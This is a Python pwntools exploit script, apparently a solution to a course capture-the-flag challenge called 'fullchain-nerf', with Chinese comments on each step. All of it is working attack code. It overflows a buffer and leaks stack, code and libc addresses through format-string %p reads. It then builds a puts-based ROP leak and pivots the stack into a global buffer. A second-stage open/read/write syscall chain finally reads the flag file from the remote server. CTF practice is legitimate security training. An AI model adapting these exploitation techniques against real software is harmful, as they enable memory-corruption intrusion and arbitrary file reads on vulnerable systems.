#!/usr/bin/python3
from pwn import *


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']



# r = process("./fullchain-nerf")
r = remote("edu-ctf.zoolab.org", 30206)


# cnt 
# 這邊local 往上塞就可以達到cnt了
def buffer_overflow_cnt():
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60') 
    r.send(b"A"*0x24 + p64(0x100))

# 因為第一個的%p會是rsi, 而這個時候因為剛做了 strncmp ("write",local,5)
# 所以 rsi會有local的位置,這樣就可以leak stack的位置
def leakStackBaseAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    local_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("----local_buffer_address",hex(local_buffer_address))

    # local_buffer_offset =    0x7fffcae27000 - 0x7fffcae25160
    # code_base_address = local_buffer_address + local_buffer_offset

    # print("code_base_address",hex(code_base_address))
    return local_buffer_address

# 因為 7$ 會是 rsp + 8,並且這個位置是 mywrite的參數addr的位置,所以我們addr放入global
# 在leak出來 就可以得到code的address
def leakCodeBaseAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("global_buffer_address ",hex(global_buffer_address))

    global_buffer_offset =   0x55dc7db6c0a0 - 0x55dc7db68000  
    code_base_address = global_buffer_address - global_buffer_offset

    print("----code_base_address",hex(code_base_address))
    return code_base_address

# r.sendlineafter("local > ",b'global')
def leakglobal_bufferAddress():
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60')
    r.send(b"%7$p\x00")

    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'write')
    p =r.recvuntil("global")

    global_buffer_address =int(p[:p.find(b'global')].decode(),16)
    print("global_buffer_address ",hex(global_buffer_address))
    return global_buffer_address


# 用rop chain ,Puts 把puts他自己的位置印出來,因為puts.plt , puts.got是我們有了code base address
# 之後就可以知道的東西 ,所以可以成功leak 出libc
def leakLibC(code_base_address):


    # elf = ELF('./fullchain-nerf')
    # poprdi = 0x00401493
    # puts_got = elf.got['puts']
    puts_got = 0x4030 + code_base_address
    # puts_plt = elf.plt['puts']
    puts_plt = 0x1120 + code_base_address
    pop_rdi = 0x16d3 + code_base_address
    # main = elf.sym['main']
    chal= 0x146a + code_base_address
    print("pop_rdi",hex(pop_rdi),"puts_got",hex(puts_got),"puts_plt",hex(puts_plt),"chal",hex(chal))
    rop = b'A'*0x24 + b'\x00'*4+ b'A'*0x10 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(chal)
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(rop)
    r.recvuntil(b'~')
    libc_address = r.recv().split()[0]
    
    puts_libc_address = u64(libc_address.ljust(8,b'\x00'))
    # libc_address = r.recv()
    # print('libc_address',libc_address)
    # print('libc_address',hex(libc_address))
    puts_offset = 0x7fe1732545a0 - 0x7fe1731cd000 
    libc_address = puts_libc_address - puts_offset
    print("---libc_address",hex(libc_address))

    # reset cnt
    r.sendline(b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'60') 
    r.send(b"A"*0x24 + p64(0x100))
    return libc_address




def write_local(value):
    r.sendlineafter("local > ",b'local')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(value)


def write_global(value):
    r.sendlineafter("local > ",b'global')
    r.sendlineafter("write > ",b'read')
    r.sendlineafter("length > ",b'96')
    r.send(value)





buffer_overflow_cnt()
code_base_address = leakCodeBaseAddress()
local_stack_address= leakStackBaseAddress()
libc_address = leakLibC(code_base_address)
global_buffer_address = leakglobal_bufferAddress()

pop_rdi_ret = 0x16d3 + code_base_address
gets = 0x86af0 + libc_address
chal= 0x146a + code_base_address
pop_rsi_ret = 0x27529 + libc_address 
pop_rdx_pop_rbx_ret = 0x162866   + libc_address
pop_rax_ret = 0x4a550  + libc_address
scanf = 0x1184 + code_base_address
ret = 0x101a  + code_base_address
leave_ret = code_base_address + 0x00000000000013dc

padding = b'A'*0x24+ p32(1) + b'A'*0x8
# 因為buffer overflow 長度不夠我們寫read的rop chain所以使用stack pivot 來轉移到global 
stack_pivot_rop = padding + flat(
    # pop_rdi_ret,open_read_write_ROP_stack,
    global_buffer_address,
    leave_ret
)
write_local(stack_pivot_rop)




# rop = padding + flat(
#     pop_rdi_ret,open_read_write_ROP_stack,
#     global_buffer_address,
#     leave_ret
# )


read = libc_address + 0x0000000000111130
pop_rdx_pop_rbx_ret = libc_address + 0x0000000000162866

open_read_write_ROP_addr = global_buffer_address + 0x48


# 這邊ROP chain 先call 一個read出來, 因為0x60還是不夠我們寫open_read_write的ROP chain 
# 所以先call 一個 read把真正要執行的ROP chain read 近來
read_ROP = flat(
    0xdeadbeef,
    pop_rdi_ret , 0,
    pop_rsi_ret , open_read_write_ROP_addr,
    pop_rdx_pop_rbx_ret, 0x100,0,
    read
)

syscall = libc_address +  0x000000000002584d
write_global(read_ROP)
open = libc_address + 0x0000000000110e50
write = libc_address + 0x00000000001111d0
shall_string_address = global_buffer_address + 0xf8
syscall_ret = libc_address + 0x0000000000066229
# open_read_write_rop chain
ROP = flat(
    pop_rdi_ret, shall_string_address,
    pop_rsi_ret, 0,
    pop_rax_ret, 2,
    syscall_ret,
    # chal

    pop_rdi_ret,3,
    pop_rsi_ret,global_buffer_address,
    pop_rdx_pop_rbx_ret,0x20,0,
    pop_rax_ret , 0,
    syscall_ret,

    pop_rdi_ret,1,
    pop_rax_ret,1,
    syscall_ret
)
ROP += b"/home/fullchain-nerf/flag\x00"

r.send(ROP)

print("---code_base_address",hex(code_base_address))
print("---stack_base_address",hex(local_stack_address))
print("---libc_address",hex(libc_address))


r.interactive()